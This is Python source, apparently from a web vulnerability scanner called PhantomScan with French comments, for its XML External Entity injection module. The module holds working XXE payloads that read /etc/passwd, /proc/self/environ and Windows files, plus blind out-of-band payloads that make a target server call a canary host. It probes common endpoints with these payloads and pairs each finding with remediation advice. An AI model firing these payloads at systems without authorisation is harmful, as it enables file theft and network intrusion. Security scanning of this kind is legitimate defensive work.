"""
PhantomScan — XXE Scanner (XML External Entity Injection)
Détection d'injection XXE dans les endpoints acceptant du XML,
les uploads de fichiers XML/SVG/DOCX, et les headers Content-Type.
"""

from __future__ import annotations

import re
import uuid
from typing import AsyncIterator
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity


# ── Marqueur unique ────────────────────────────────────────────────────────────

MARKER = f"psxxe{uuid.uuid4().hex[:8]}"

# ── Payloads XXE ───────────────────────────────────────────────────────────────

# Cibles de lecture locale (signature attendue dans la réponse)
# FIX: /etc/hostname avait un regex trop générique [a-z0-9\-]{2,64}
# qui matchait n'importe quel mot. On exige maintenant que la réponse
# contienne le marqueur XXE ET une string qui ressemble à un hostname
# (pas de slash, pas d'espace, longueur raisonnable) ABSENT de la baseline.
_FILE_TARGETS: list[tuple[str, str, re.Pattern]] = [
    ("/etc/passwd",        "Linux /etc/passwd",   re.compile(r"root:.*:/bin/(?:bash|sh)", re.S)),
    ("/etc/hostname",      "Linux hostname",       re.compile(r"^[a-z0-9][a-z0-9\-]{1,62}$", re.M)),
    ("/etc/hosts",         "Linux /etc/hosts",     re.compile(r"127\.0\.0\.1\s+localhost", re.I)),
    ("/proc/self/environ", "Process environ",      re.compile(r"PATH=|HOME=|USER=", re.I)),
    ("C:/Windows/win.ini", "Windows win.ini",      re.compile(r"\[fonts\]|\[extensions\]", re.I)),
    ("C:/boot.ini",        "Windows boot.ini",     re.compile(r"\[boot loader\]", re.I)),
]

# Payloads de base (file read + OOB + error-based)
def _build_payloads(file_path: str, marker: str) -> list[tuple[str, str]]:
    """Génère plusieurs variantes de payload XXE pour un chemin cible."""
    ent = f"xxe_{marker}"
    return [
        # ── Classique in-band ──────────────────────────────────────────────
        (
            f'<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE root [<!ENTITY {ent} SYSTEM "file://{file_path}">]>'
            f'<root>&{ent};</root>',
            "classic in-band",
        ),
        # ── Paramètre entity ──────────────────────────────────────────────
        (
            f'<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE root [<!ENTITY % {ent} SYSTEM "file://{file_path}"> %{ent};]>'
            f'<root>test</root>',
            "parameter entity",
        ),
        # ── XInclude (pas de DTD nécessaire) ──────────────────────────────
        (
            f'<root xmlns:xi="http://www.w3.org/2001/XInclude">'
            f'<xi:include parse="text" href="file://{file_path}"/>'
            f'</root>',
            "XInclude",
        ),
        # ── SVG avec XInclude ─────────────────────────────────────────────
        (
            f'<?xml version="1.0"?>'
            f'<svg xmlns="http://www.w3.org/2000/svg" '
            f'xmlns:xi="http://www.w3.org/2001/XInclude">'
            f'<xi:include href="file://{file_path}" parse="text"/>'
            f'</svg>',
            "SVG + XInclude",
        ),
        # ── CDATA wrapping (bypass filtre naïf) ───────────────────────────
        (
            f'<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE root ['
            f'<!ENTITY % wrap "<!ENTITY {ent} SYSTEM \'file://{file_path}\'>">'
            f'%wrap;]>'
            f'<root><![CDATA[&{ent};]]></root>',
            "CDATA wrap",
        ),
    ]


# Content-Types XML courants à tester
_XML_CONTENT_TYPES: list[str] = [
    "application/xml",
    "text/xml",
    "application/xhtml+xml",
    "application/soap+xml",
    "image/svg+xml",
]

# Chemins d'endpoints potentiellement XML
_XML_ENDPOINTS: list[str] = [
    "/api",
    "/api/v1",
    "/api/v2",
    "/ws",
    "/soap",
    "/xmlrpc",
    "/xmlrpc.php",
    "/rpc",
    "/upload",
    "/import",
    "/parse",
    "/convert",
    "/feed",
    "/rss",
    "/sitemap.xml",
    "/services",
]

# Paramètres GET souvent associés à du contenu XML
_XML_PARAMS: list[str] = ["xml", "data", "input", "body", "content", "payload", "query"]

# Regex pour détecter qu'une réponse contient du XML (endpoint probable)
_XML_RESP_RE = re.compile(
    r'<\?xml|<soap:|<wsdl:|xmlns=|Content-Type[^:]*:\s*(?:application|text)/xml',
    re.I,
)

# FIX: payload neutre pour établir une baseline (même structure XML, sans XXE)
def _build_baseline_payload() -> str:
    return '<?xml version="1.0" encoding="UTF-8"?><root>baseline</root>'


from phantomscan.core.scanner_mixin import ScannerMixin


class XXEScanner(ScannerMixin):
    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req   = req
        self._heur  = heuristic
        self._cfg   = cfg

    async def run(self, target: str) -> AsyncIterator[Finding]:
        parsed = urlparse(target)
        base   = f"{parsed.scheme}://{parsed.netloc}"

        # ── 1. Probe les endpoints XML connus ────────────────────────────────
        async for f in self._probe_xml_endpoints(base, parsed):
            yield f

        # ── 2. Teste les paramètres GET existants avec XML ────────────────────
        params = parse_qs(parsed.query, keep_blank_values=True)
        async for f in self._test_xml_params(target, parsed, params):
            yield f

        # ── 3. POST XML sur l'URL cible directe ──────────────────────────────
        async for f in self._post_xml_body(target):
            yield f

        # ── 4. v5.19 — XXE BLIND via OOB canary ───────────────────────────────
        if self.oob is not None and self.oob.enabled:
            async for f in self._probe_blind_xxe_oob(target, base):
                yield f

    async def _probe_blind_xxe_oob(self, target: str, base: str) -> AsyncIterator[Finding]:
        """
        v5.19 — Détection XXE blind via entité externe vers le canary OOB.

        Stratégie : on envoie un XML qui définit une entité externe pointant
        vers `http://<canary>/`. Si le parser XML résout l'entité, le serveur
        fait un GET sortant vers le canary → callback DNS/HTTP confirme XXE.

        Couvre les cas où :
          - Le parser ne renvoie pas le contenu (XXE blind out-of-band)
          - Le parser strip les entités locales mais pas les externes
          - L'endpoint accepte du XML mais ne renvoie pas le résultat parsé
        """
        canary = self.get_canary(tag="xxe-blind")
        if canary is None:
            return

        # Payloads OOB classiques (plusieurs styles selon les parsers)
        oob_payloads = [
            # Entité externe HTTP → callback direct
            (
                f'<?xml version="1.0"?>'
                f'<!DOCTYPE r [<!ENTITY x SYSTEM "{canary.http_url}">]>'
                f'<r>&x;</r>',
                "External entity HTTP",
            ),
            # Parameter entity (pour parsers qui restreignent les entités générales)
            (
                f'<?xml version="1.0"?>'
                f'<!DOCTYPE r [<!ENTITY % x SYSTEM "{canary.http_url}/dtd"> %x;]>'
                f'<r/>',
                "Parameter entity",
            ),
            # Via SOAP
            (
                f'<?xml version="1.0"?>'
                f'<!DOCTYPE soap [<!ENTITY x SYSTEM "{canary.http_url}">]>'
                f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
                f'<soap:Body><test>&x;</test></soap:Body></soap:Envelope>',
                "SOAP envelope",
            ),
        ]

        # On essaie sur le target direct + un endpoint /api/parse-xml typique
        from phantomscan.core.requester import ProbeRequest
        candidate_urls = [target, f"{base}/api/xml", f"{base}/api/parse"]

        for payload, desc in oob_payloads:
            for url in candidate_urls:
                try:
                    await self._req.send(ProbeRequest(
                        method="POST",
                        url=url,
                        headers={"Content-Type": "application/xml"},
                        body=payload,
                    ))
                except Exception:
                    continue

        # Polling des hits OOB
        hits = await self.wait_for_oob_hit(canary, timeout=15.0)
        if hits:
            proto = hits[0].get("protocol", "?")
            remote = hits[0].get("remote_address", "?")
            yield Finding(
                title=f"XXE BLIND CONFIRMED — External Entity → OOB callback",
                severity=Severity.HIGH,
                url=target,
                module="vulns/xxe",
                description=(
                    f"XXE blind confirmé : le parser XML a résolu une entité "
                    f"externe et émis une requête {proto.upper()} sortante "
                    f"vers le canary OOB. Origine : {remote}.\n"
                    f"Cette vuln permet au minimum de scanner le réseau interne, "
                    f"souvent de lire des fichiers locaux (file:///), et selon "
                    f"le parser, parfois RCE (CVE-2018-12533, etc.)."
                ),
                evidence=(
                    f"Canary callback received | proto={proto} | remote={remote}"
                ),
                cwe="CWE-611",
                remediation=(
                    "Désactiver les entités externes et les DTDs dans tous les "
                    "parsers XML (libxml2: LIBXML_NOENT=0, LIBXML_DTDLOAD=0 ; "
                    "Java: setFeature 'disallow-doctype-decl' à true ; "
                    ".NET: XmlReaderSettings.DtdProcessing=Prohibit). "
                    "Préférer des formats sécurisés (JSON) quand possible."
                ),
            )

    # ── Probe endpoints XML ───────────────────────────────────────────────────

    async def _probe_xml_endpoints(
        self,
        base: str,
        parsed,
    ) -> AsyncIterator[Finding]:
        for endpoint in _XML_ENDPOINTS:
            url = base + endpoint

            # Sonde d'abord sans payload pour voir si ça répond XML
            resp = await self._req.get(url)
            if resp.error:
                continue

            if resp.status in (404, 410, 400):
                continue
            is_xml_endpoint = (
                _XML_RESP_RE.search(resp.body or "")
                or _XML_RESP_RE.search(" ".join(
                    f"{k}: {v}" for k, v in (resp.headers or {}).items()
                ))
            )
            if not is_xml_endpoint and resp.status not in (200, 405, 415, 500):
                continue

            # Endpoint potentiellement XML → injecter payloads
            async for f in self._inject_xml_post(url, context=f"endpoint {endpoint}"):
                yield f
                return

    # ── Paramètres GET ────────────────────────────────────────────────────────

    async def _test_xml_params(
        self,
        target: str,
        parsed,
        params: dict,
    ) -> AsyncIterator[Finding]:
        xml_params = [
            p for p in params
            if p.lower() in _XML_PARAMS or p.lower().startswith("xml")
        ]

        for param in xml_params:
            async for f in self._inject_param(target, parsed, params, param):
                yield f

    async def _inject_param(
        self,
        target: str,
        parsed,
        params: dict,
        param: str,
    ) -> AsyncIterator[Finding]:
        for file_path, file_desc, sig_re in _FILE_TARGETS:
            for payload, payload_desc in _build_payloads(file_path, MARKER):
                fuzzed = dict(params)
                fuzzed[param] = [payload]
                fuzz_url = urlunparse(
                    parsed._replace(query=urlencode(fuzzed, doseq=True))
                )
                resp = await self._req.get(fuzz_url)
                if resp.error:
                    continue

                if resp.status in (404, 410, 400):
                    continue

                # FIX: établir baseline pour comparer
                baseline_fuzzed = dict(params)
                baseline_fuzzed[param] = [_build_baseline_payload()]
                baseline_url = urlunparse(
                    parsed._replace(query=urlencode(baseline_fuzzed, doseq=True))
                )
                baseline_resp = await self._req.get(baseline_url)
                baseline_body = baseline_resp.body or "" if not baseline_resp.error else ""

                body = resp.body or ""
                if self._detect_xxe(body, sig_re, baseline_body):
                    # v5.21 — FP guard : entropie de la signature matchée
                    m_xxe = sig_re.search(body)
                    if m_xxe and not self.sig_entropy_ok(m_xxe.group(0), body, min_entropy=2.0):
                        continue
                    # v5.21 — re-probe pour confirmer
                    reprobe_r = await self.re_probe(fuzz_url, delay_s=0.4)
                    if reprobe_r is None or not self._detect_xxe(reprobe_r.body or "", sig_re, baseline_body):
                        continue  # non reproductible → FP
                    yield Finding(
                        title=f"XXE — lecture fichier via param `{param}` ({file_desc})",
                        severity=Severity.CRITICAL,
                        url=fuzz_url,
                        module="vulns/xxe",
                        description=(
                            f"Injection XXE réussie via le paramètre GET `{param}`. "
                            f"La réponse contient le contenu de `{file_path}`. "
                            f"Variante: {payload_desc}."
                        ),
                        evidence=(
                            f"Payload: {payload[:100]}... | "
                            f"Fichier cible: {file_path} | HTTP {resp.status}"
                        ),
                        cwe="CWE-611",
                        remediation=(
                            "Désactiver le traitement des entités externes dans le parser XML "
                            "(setFeature FEATURE_EXTERNAL_GENERAL_ENTITIES=false). "
                            "Valider et rejeter tout input XML non attendu. "
                            "Utiliser des parsers sécurisés (defusedxml en Python, "
                            "XXEFactory en Java). "
                            "Appliquer le principe du moindre privilège sur les accès fichier."
                        ),
                    )
                    return

    # ── POST XML direct ───────────────────────────────────────────────────────

    async def _post_xml_body(self, target: str) -> AsyncIterator[Finding]:
        async for f in self._inject_xml_post(target, context="body POST"):
            yield f

    async def _inject_xml_post(
        self,
        url: str,
        context: str,
    ) -> AsyncIterator[Finding]:
        for ct in _XML_CONTENT_TYPES:
            # FIX: récupérer la baseline AVANT d'injecter, même Content-Type
            baseline_resp = await self._req.send(ProbeRequest(
                method="POST",
                url=url,
                headers={"Content-Type": ct},
                body=_build_baseline_payload(),
            ))
            baseline_body = baseline_resp.body or "" if not baseline_resp.error else ""

            for file_path, file_desc, sig_re in _FILE_TARGETS:
                for payload, payload_desc in _build_payloads(file_path, MARKER):
                    resp = await self._req.send(ProbeRequest(
                        method="POST",
                        url=url,
                        headers={"Content-Type": ct},
                        body=payload,
                    ))
                    if resp.error:
                        continue

                    if resp.status in (404, 410, 400):
                        continue

                    body_post = resp.body or ""
                    if self._detect_xxe(body_post, sig_re, baseline_body):
                        m_xxe2 = sig_re.search(body_post)
                        if m_xxe2 and not self.sig_entropy_ok(m_xxe2.group(0), body_post, min_entropy=2.0):
                            continue
                        reprobe_r2 = await self.re_probe(target, method="POST", delay_s=0.4)
                        if reprobe_r2 is None or not self._detect_xxe(reprobe_r2.body or "", sig_re, baseline_body):
                            continue
                        yield Finding(
                            title=f"XXE — lecture fichier via {context} ({file_desc})",
                            severity=Severity.CRITICAL,
                            url=url,
                            module="vulns/xxe",
                            description=(
                                f"Injection XXE réussie via {context} "
                                f"(Content-Type: {ct}). "
                                f"La réponse expose le contenu de `{file_path}`. "
                                f"Variante de payload: {payload_desc}."
                            ),
                            evidence=(
                                f"Content-Type: {ct} | "
                                f"Payload: {payload[:100]}... | "
                                f"Fichier: {file_path} | HTTP {resp.status}"
                            ),
                            cwe="CWE-611",
                            remediation=(
                                "Désactiver les entités externes dans votre parser XML. "
                                "Valider le Content-Type reçu côté serveur. "
                                "Utiliser defusedxml (Python), JAXP secure processing (Java), "
                                "ou libxml2 avec LIBXML_NOENT=0 (PHP). "
                                "Ne jamais parser du XML provenant d'une source non-fiable "
                                "sans sandbox stricte."
                            ),
                        )
                        return

    # ── Détection ─────────────────────────────────────────────────────────────

    @staticmethod
    def _detect_xxe(body: str, sig_re: re.Pattern, baseline: str) -> bool:
        """
        Vérifie si la signature du fichier exfiltré apparaît dans la réponse
        ET est absente de la baseline (évite les faux positifs).
        """
        if not sig_re.search(body):
            return False
        # FIX: si le même pattern était déjà dans la réponse baseline → faux positif
        if baseline and sig_re.search(baseline):
            return False
        return True
